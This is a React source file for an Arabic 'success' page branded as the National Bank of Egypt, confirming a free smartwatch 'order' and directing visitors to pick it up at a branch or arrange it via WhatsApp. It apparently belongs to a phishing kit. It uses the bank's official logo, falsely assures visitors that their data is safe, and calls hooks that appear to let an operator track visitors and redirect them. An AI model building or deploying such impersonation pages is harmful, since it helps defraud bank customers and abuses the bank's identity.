/**
 * البنك الأهلي المصري - صفحة النجاح
 * بدون جوائز - مع إظهار الساعة
 */
import { useLocation } from "wouter";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function Success() {
  const [, setLocation] = useLocation();
  usePresence("success");
  useAdminRedirect();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", position: "relative" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "480px", width: "100%", padding: "32px 24px", textAlign: "center" }}>
        {/* Success Icon */}
        <div
          
          
          
          style={{ width: "100px", height: "100px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px", border: "3px solid #dcfce7" }}
        >
          <svg width="50" height="50" viewBox="0 0 24 24" fill="none">
            <path d="M20 6L9 17l-5-5" stroke="#1B7A3D" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>

        <h1
          
          
          
          style={{ color: "#1a1a1a", fontSize: "28px", fontWeight: "800", marginBottom: "8px" }}
        >
          تم تأكيد طلبك بنجاح!
        </h1>
        <p
          
          
          
          style={{ color: "#666", fontSize: "14px", marginBottom: "28px" }}
        >
          مرحباً بك كعميل مميز في البنك الأهلي المصري. ساعتك في انتظار التسليم من أقرب فرع
        </p>

        {/* Watch Image */}
        <div
          
          
          
          style={{ background: "#f8faf9", borderRadius: "20px", padding: "24px", marginBottom: "28px", border: "1px solid #dcfce7", boxShadow: "0 4px 20px rgba(27,122,61,0.08)" }}
        >
          <img
            src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]}
            alt="ساعتك الذكية"
            style={{ width: "150px", height: "150px", objectFit: "contain", margin: "0 auto 14px", display: "block", filter: "drop-shadow(0 8px 24px rgba(0,0,0,0.15))" }}
            onError={handleWatchImageError}
          />
          <p style={{ color: "#1B7A3D", fontWeight: "700", fontSize: "16px", margin: "0 0 4px" }}>ساعتك الذكية جاهزة</p>
          <p style={{ color: "#666", fontSize: "13px", margin: 0 }}>اللون: {WATCH_NAMES[watchColor] || watchColor}</p>
        </div>

        {/* Info Cards */}
        <div
          
          
          
          style={{ display: "flex", flexDirection: "column", gap: "12px", marginBottom: "32px" }}
        >
          {[
            { icon: "📍", text: "استلم ساعتك من أقرب فرع للبنك الأهلي" },
            { icon: "📱", text: "تواصل معنا عبر واتساب لتحديد موعد الاستلام" },
            { icon: "🔒", text: "بياناتك آمنة ومحمية بالكامل" },
          ].map((item, i) => (
            <div key={i} style={{ display: "flex", alignItems: "center", gap: "12px", padding: "14px 16px", background: "#fafafa", borderRadius: "12px", textAlign: "right", border: "1px solid #e5e7eb" }}>
              <span style={{ fontSize: "20px" }}>{item.icon}</span>
              <span style={{ color: "#333", fontSize: "14px" }}>{item.text}</span>
            </div>
          ))}
        </div>

        <button onClick={() => setLocation("/")}
          style={{ background: "#f0fdf4", color: "#1B7A3D", border: "1px solid #dcfce7", borderRadius: "12px", padding: "14px 32px", fontSize: "15px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
          العودة للرئيسية
        </button>

        <p style={{ color: "#999", fontSize: "11px", marginTop: "24px" }}>© 2026 البنك الأهلي المصري - مصر</p>
      </div>
    </div>
  );
}
